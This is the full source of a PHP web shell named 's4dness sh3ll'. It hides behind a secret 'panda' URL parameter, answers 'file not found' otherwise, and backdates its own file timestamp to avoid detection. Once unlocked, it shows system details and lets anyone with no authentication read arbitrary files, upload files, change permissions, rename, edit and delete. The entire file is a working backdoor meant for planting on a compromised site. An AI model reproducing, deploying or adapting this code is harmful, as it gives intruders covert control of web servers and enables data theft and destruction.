<?php
$files = glob("*.*");
if (count($files) > 1) {
    $time = array();
    for ($i = 0;$i < count($files);$i++) {
        $time[] = filemtime($files[$i]);
    }
    @touch($_SERVER["SCRIPT_FILENAME"], min($time));
} else {
    @touch($_SERVER["SCRIPT_FILENAME"], filemtime("./"));
}
	
	$show = "panda";
	if(isset($_GET[$show])) {

	error_reporting(0);
	set_time_limit(0);
	
	if(get_magic_quotes_gpc()) {
		foreach($_POST as $key=>$value) {
			$_POST[$key] = stripslashes($value);
		}
	}
	
	$os = php_uname();
	$ip = getHostByName(getHostName());
	$ver = phpversion();
	$web = $_SERVER['HTTP_HOST'];
	$sof = $_SERVER['SERVER_SOFTWARE']; 

	echo '<!DOCTYPE HTML>
	<html>
	<head>
	<link href="https://fonts.googleapis.com/css?family=Kalam|Kaushan+Script&display=swap" rel="stylesheet">
	<link rel="shortcut icon" href="https://i.ibb.co/9q8NQjC/Programmer.jpg">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
	<title>{ '.$web.' ~ s4dness sh3ll }</title>
	<style>

		body{
			font-family: "Kalam", cursive;
			background-color: black;
			color: red;
		}
		
		#content tr:hover{
			background-color: #191919;
			text-shadow:0px 0px 10px #fff;
		}

		#content .first{
			background-color: #191919;
		}
		
		table{
			border: 1px #000000 dotted;
		}
		
		a{
			color:white;
			text-decoration: none;
		}
		
		a:hover{
			color:red;
		}
		
		input,select,textarea{
			border: 1px #000000 solid;
			-moz-border-radius: 5px;
			-webkit-border-radius:5px;
			border-radius:5px;
		}
		
		.dow {
			text-shadow:
				0 1px #808d93,
				-1px 0 #cdd2d5,
				-1px 2px #808d93,
				-2px 1px #cdd2d5,
				-2px 3px #808d93,
				-3px 2px #cdd2d5,
				-3px 4px #808d93,
				-4px 3px #cdd2d5,
				-4px 5px #808d93,
				-5px 4px #cdd2d5,
				-5px 6px #808d93,
				-6px 5px #cdd2d5,
				-6px 7px #808d93,
				-7px 6px #cdd2d5,
				-7px 8px #808d93,
				-8px 7px #cdd2d5;
		}
		
	</style>
</head>
<body>
	
	<br><h1 class="dow"><center>
		<a href=?'.$show.'><font color="red">s4dness sh3ll</font><a>
	</center></h1><br>
	
	<div id="content">
	
		<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr><td><font size="4px" color="cyan">uname : '.$os.'</font>
		<tr><td><font size="4px" color="cyan">ip : '.$ip.'</font>
		<tr><td><font size="4px" color="cyan">php : '.$ver.'</font>
		<tr><td><font size="4px" color="cyan">web : '.$web.'</font>
		<tr><td><font size="4px" color="cyan">software : '.$sof.'</font>
		<tr><td><font size="4px" color="cyan">Current Dir : </font> ';
		
		if(isset($_GET['path'])){
			$path = $_GET['path'];
		} else {
			$path = getcwd();
		}
		
		$path = str_replace('\\','/',$path);
		$paths = explode('/',$path);
		
		foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
				echo '<a href="?'.$show.'&path=/">/</a>';
				continue;
			}
			
			if($pat == '') continue;
				echo '<font size="2px"><a href="?'.$show.'&path=';
				for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
				if($i != $id) echo "/";
			}
			echo '">'.$pat.'</a></font>/';
		}
		
		echo '</td></tr><tr><td>';
		if(isset($_FILES['file'])){
			if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
			echo '<font color="lime">Upload Success</font><br />';
			} else {
				echo '<font color="red">Upload Failed</font><br/>';
			}
		}
		
		echo '<form enctype="multipart/form-data" method="POST">
		<font color="white">Upload : </font> <input type="file" name="file">
		<input type="submit" value=">>" />
		</form>
		</td></tr>';
		
		if(isset($_GET['filesrc'])) {
			echo "<tr><td>Current File : ";
			echo $_GET['filesrc'];
			echo '</tr></td></table><br />';
			echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
		} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete') {
			echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
			
			if($_POST['opt'] == 'chmod'){
				if(isset($_POST['perm'])){
					if(chmod($_POST['path'],$_POST['perm'])){
						echo '<font color="lime">Change Permission Success</font><br/>';
					} else {
					echo '<font color="red">Change Permission Failed</font><br />';
					}
				}
		
		echo '<form method="POST">
			Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="opt" value="chmod">
			<input type="submit" value="Go" />
		</form>';
		
		} elseif($_POST['opt'] == 'rename') {
			if(isset($_POST['newname'])){
				if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
				echo '<font color="lime">Change Name Success</font><br/>';
			}else{
				echo '<font color="red">Change Name Failed</font><br />';
			}
				$_POST['name'] = $_POST['newname'];
		}
		
		echo '<form method="POST">
		New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="rename">
		<input type="submit" value="Go" />
		</form>';
		
		}elseif($_POST['opt'] == 'edit'){
			if(isset($_POST['src'])){
				$fp = fopen($_POST['path'],'w');
				if(fwrite($fp,$_POST['src'])){
					echo '<font color="lime">Edit File Success</font><br/>';
				} else {
					echo '<font color="red">Edit File Failed</font><br/>';
				}
				fclose($fp);
			}
			
			echo '<form method="POST">
				<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
				<input type="hidden" name="path" value="'.$_POST['path'].'">
				<input type="hidden" name="opt" value="edit">
				<input type="submit" value="Save" />
				</form>';
			}
			
			echo '</center>';
		}else{
			echo '</table><br/><center>';
			if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
			if($_POST['type'] == 'dir'){
				if(rmdir($_POST['path'])){
					echo '<font color="lime">Directory Deleted</font><br/>';
				} else {
					echo '<font color="red">Failed Delete Dir                                                                                                                                                                                                                                                                                           </font><br/>';
				}
		}elseif($_POST['type'] == 'file'){
			if(unlink($_POST['path'])){
				echo '<font color="lime">File Deleted</font><br/>';
			}else{
				echo '<font color="red">Failed Delete File</font><br/>';
			}
		}
	}
	
		echo '</center>';
		$scandir = scandir($path);
		echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr class="first">
		<td><center><font size="2px">Name</font></peller></center></td>
		<td><center><font size="2px">Size</font></peller></center></td>
		<td><center><font size="2px">Permission</font></peller></center></td>
		<td><center><font size="2px">Modify</peller></font></center></td>
</tr>
		<tr class="first"><td></td><td></td><td></td><td></td></tr>';

		foreach($scandir as $dir){
			if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
			echo '<tr>
			<td><font size="5px"><a href="?'.$show.'&path='.$path.'/'.$dir.'"><font color="lime">'.$dir.'</font></a></font></td>
			<td><font size="5px"><center>--</center></font></td>
			<td><font size="5px"><center>';
			
			if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
			elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
				echo perms($path.'/'.$dir);
				if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

					echo '</font></center></td>
					<td><center><form method="POST" action="?'.$show.'&option&path='.$path.'">
					<select name="opt">
					<option value="">Select</option>
					<option value="delete">Delete</option>
					<option value="chmod">Chmod</option>
					<option value="rename">Rename</option>
					</select>
					<input type="hidden" name="type" value="dir">
					<input type="hidden" name="name" value="'.$dir.'">
					<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
					<input type="submit" value=">">
					</form></center></td>
					</tr>';
				}
				
			echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
			
			foreach($scandir as $file){
				if(!is_file($path.'/'.$file)) continue;
				$size = filesize($path.'/'.$file)/1024;
				$size = round($size,3);
				
				if($size >= 1024){
					$size = round($size/1024,2).' MB';
				}else{
					$size = $size.' KB';
				}

				echo '<tr>
				<td><font size="5px"><a href="?'.$show.'&filesrc='.$path.'/'.$file.'&path='.$path.'"><font color="cyan">'.$file.'</font></a></font></td>
				<td><font size="5px"><center>'.$size.'</center></font></td>
				<td><font size="5px"><center>';
				if(is_writable($path.'/'.$file)) echo '<font color="lime">';
				elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
					echo perms($path.'/'.$file);
					if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
						echo '</font></center></td>
						<td><center><form method="POST" action="?'.$show.'&option&path='.$path.'">
						<select name="opt">
						<option value="">Select</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
						<option value="rename">Rename</option>
						<option value="edit">Edit</option>
						</select>
						<input type="hidden" name="type" value="file">
						<input type="hidden" name="name" value="'.$file.'">
						<input type="hidden" name="path" value="'.$path.'/'.$file.'">
						<input type="submit" value=">">
						</form></center></td>
						</tr>';
					}
					
			echo '</table>
		</div>';
	}
	
	echo '
		<center><p>
			<font size="5px" weight="8px">{ Vengeful Ghost }</p>
		</p></center>
		</body>
		</html>';
		
	} else {
		echo "file not found";
	}
	
		function perms($file){
			$perms = fileperms($file);

			if (($perms & 0xC000) == 0xC000) {
			// Socket
				$info = 's';
			} elseif (($perms & 0xA000) == 0xA000) {
			// Symbolic Link
				$info = 'l';
			} elseif (($perms & 0x8000) == 0x8000) {
			// Regular
				$info = '-';
			} elseif (($perms & 0x6000) == 0x6000) {
			// Block special
				$info = 'b';
			} elseif (($perms & 0x4000) == 0x4000) {
			// Directory
				$info = 'd';
			} elseif (($perms & 0x2000) == 0x2000) {
			// Character special
				$info = 'c';
			} elseif (($perms & 0x1000) == 0x1000) {
			// FIFO pipe
				$info = 'p';
			} else {
			// Unknown
				$info = 'u';
			}

			// Owner
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));

			// Group
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));

			// World
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));

			return $info;
		}

?>